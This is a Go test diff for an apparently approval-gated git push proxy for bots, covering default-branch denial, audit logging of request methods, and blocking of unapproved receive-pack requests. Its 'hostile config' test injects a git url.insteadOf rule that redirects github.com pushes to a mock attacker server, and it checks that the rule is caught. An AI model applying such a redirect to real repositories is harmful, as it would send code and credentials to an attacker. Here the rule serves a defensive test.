@@ -4,6 +4,7 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"net"
 	"net/http"
 	"net/http/httptest"
 	"os"
@@ -154,8 +155,12 @@ echo PUSH_DONE
 		if err != nil || !strings.Contains(out, "git push sent") || !strings.Contains(out, "PUSH_DONE") {
 			t.Fatalf("send: %v\n%s", err, out)
 		}
-		if !strings.Contains(readAudit(t, auditPath), "github_push_allowed") {
+		rawAudit := readAudit(t, auditPath)
+		if !strings.Contains(rawAudit, "github_push_allowed") {
 			t.Fatal("audit missing github_push_allowed")
+		}
+		if !strings.Contains(rawAudit, `"method":"GET"`) || !strings.Contains(rawAudit, `"method":"POST"`) {
+			t.Fatalf("audit missing method:\n%s", rawAudit)
 		}
 		if evals.Load() == 0 {
 			t.Fatal("card path did not call Evaluate")
@@ -296,6 +301,36 @@ echo PUSH_DONE
 `
 		deny(t, cmd, "default branch")
 	})
+	t.Run("default branch case", func(t *testing.T) {
+		cmd := `set -e
+git init
+git checkout -b Main
+echo hello > readme.txt
+git add readme.txt
+git commit -m note-Main
+git push https://github.com/acme/widgets.git Main
+echo PUSH_DONE
+`
+		deny(t, cmd, "default branch")
+	})
+	t.Run("hostile config", func(t *testing.T) {
+		var hits atomic.Int32
+		attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+			hits.Add(1)
+			http.Error(w, "no", http.StatusForbidden)
+		}))
+		t.Cleanup(attacker.Close)
+		app, evals, auditPath := newPushApp(t)
+		before := packs.Load()
+		extra := fmt.Sprintf("printf '%%s\\n' '[url \"%s/\"]' '\tinsteadOf = https://github.com/' >> .git/config\ngit push https://github.com/acme/widgets.git feature-cfg\n", attacker.URL)
+		out, err := runPush(t, app, auditPath, []string{"acme/widgets"}, feature("feature-cfg", "note-cfg", extra), false)
+		if err == nil || !strings.Contains(out, "config") || strings.Contains(out, "PUSH_DONE") || strings.Contains(out, "git push sent") {
+			t.Fatalf("config: %v\n%s", err, out)
+		}
+		if evals.Load() != 0 || packs.Load() != before || hits.Load() != 0 {
+			t.Fatalf("config reached a push evals=%d packs=%d hits=%d", evals.Load(), packs.Load()-before, hits.Load())
+		}
+	})
 	t.Run("empty allowlist", func(t *testing.T) {
 		app, evals, auditPath := newPushApp(t)
 		before := packs.Load()
@@ -333,6 +368,36 @@ func approveGitPush(app *App, botID string) <-chan error {
 				runID, _ := list[0]["run_id"].(string)
 				if list[0]["tool"] != "git_push" {
 					errc <- fmt.Errorf("card tool %#v", list[0]["tool"])
+					return
+				}
+				if app.writeProxyUp() {
+					errc <- errors.New("write proxy reachable before approval")
+					return
+				}
+				sock := app.gitHubReadSock(botID)
+				if sock == "" {
+					errc <- errors.New("read socket missing before approval")
+					return
+				}
+				client := &http.Client{Transport: &http.Transport{
+					Dial: func(network, addr string) (net.Conn, error) {
+						return net.Dial("unix", sock)
+					},
+				}}
+				req, rerr := http.NewRequest(http.MethodPost, "http://proxy/github/acme/widgets.git/git-receive-pack", strings.NewReader("0000"))
+				if rerr != nil {
+					errc <- rerr
+					return
+				}
+				res, rerr := client.Do(req)
+				if rerr != nil {
+					errc <- rerr
+					return
+				}
+				body, _ := io.ReadAll(res.Body)
+				res.Body.Close()
+				if res.StatusCode != http.StatusForbidden || strings.Contains(string(body), pushSecret) {
+					errc <- fmt.Errorf("jail receive-pack status %d body %q", res.StatusCode, body)
 					return
 				}
 				if err := app.perm.DecideFor(botID, runID, id, permission.AllowOnce); err != nil {
